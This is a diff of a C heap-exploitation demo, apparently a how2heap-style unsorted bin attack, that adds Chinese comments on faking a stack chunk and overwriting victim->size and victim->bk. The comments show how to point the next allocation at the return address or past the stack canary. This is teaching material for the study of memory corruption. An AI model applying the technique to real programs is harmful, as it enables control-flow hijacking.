@@ -21,13 +21,17 @@ int main() {
 
 	printf("Create a fake chunk on the stack");
 	printf("Set size for next allocation and the bk pointer to any writable address");
-	//!绕过大小合法性检测，且保证下次分配到此空间
+	//!符合chunk大小范围，且保证下次分配到此空间(仅需要将此处fake chunk 的 size域改为和下次malloc相匹配的即可)
+	//实际空间大小=请求大小 + 2 * SIZE_SZ，此时chunk未在使用，inuse bit为0
 	stack_buffer[1] = 0x100 + 0x10;
+	//victim -> bk -> bk pointing to stack
 	stack_buffer[3] = (intptr_t)stack_buffer;
 
 	//------------VULNERABILITY-----------
 	printf("Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointer\n");
 	printf("Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem\n");
+	//*修改当前在unsorted bin中的chunk的size，保证下次分配直接分配到fake chunk从而实现控制stack上的数据
+	//*可选步骤，可通过多次分配chunk来实现不修改victim的size域分配fake chunk
 	victim[-1] = 32;
 	//!构造fake chunk地址，位于stack中可制造overflow或绕过canary控制返回地址
 	//*此处stack_buffer可控制为return_addr - 2 * SIZE_SZ(rbp - SIZE_SZ)的位置
